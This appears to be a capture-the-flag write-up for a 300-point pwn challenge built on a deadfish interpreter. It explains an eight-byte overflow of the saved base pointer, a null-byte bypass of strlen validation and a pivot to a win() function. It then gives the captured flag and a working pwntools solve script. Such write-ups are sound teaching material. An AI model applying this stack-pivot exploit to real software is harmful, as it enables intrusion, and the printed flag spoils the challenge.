@@ -1,0 +1,53 @@
+NAME: f1shybuff3r
+CATEGORY: pwn
+POINTS: 300
+DOWNLOAD LINK: http://chal.ctf-league.osusec.org/deadfish
+ACCESS: nc chal.ctf-league.osusec.org, 1385
+DESCRIPTION: Learned about this programming language called deadfish but it can't 
+do anything interesting.  You can't even call a function in deadfish!  Therefore, 
+I'm super confident my flag will remain safe & secure.
+
+Buffer overflow is back, with a twist! In this week's challenge, the buffer isn't
+big enough to allow us to overflow the return address of the function, but it IS
+enough to overflow the Return Base Pointer, which is enough for us to be able to
+do shenanigans. Running the program also gives us its start address (useful!)
+
+Looking at the decompiled binary, we see that the buffer is 256 bytes, but fgets
+reads in 264: giving us the 8 bytes we need to overwrite RBP. 
+
+After fgets are two functions: validate_program() and execute(). execute() looks
+pretty useless, but validate_program() performs some checks on the buffer that are 
+important for us to pass. It checks the length of the buffer using strlen(), which
+means we can lie about the buffer length by putting a sneaky \0 in there, and makes
+sure that each character in the buffer is either an i, j, d, s, o, or newline. 
+
+The program also has a win() function that prints the flag, so we want to note down
+its address using the elf.symbols['win'] function from pwntools. 
+
+Constructing the payload:
+	- first we want 7 'i's and a null terminator, as the 8 bytes that get popped at end of the program
+	- then we want the address of the function we'll want to return to, ie win()
+	- then buffer length - 16 bytes of just random things (I put ds)
+	- then the address of out current function, leaked to us
+	
+now we send off the payload and receive our flag!
+	submit osu{wh0_says_d3adf1sh_ha5_n0_c0ntr0l_fl0w?}
+
+Solve script, for more context:
+from pwn import *
+
+#p = process("./deadfish")
+p = remote("chal.ctf-league.osusec.org", 1385)
+
+elf = ELF("./deadfish")
+win = elf.symbols['win']
+
+#do some slicing
+leak = p.recvline()
+leak = leak[-16:-2]
+
+print(leak)
+
+p.sendline(b'i'*7 + b'\0' + p64(win) + b'd'*240 + p64(int(leak, 16)))
+p.interactive()
+
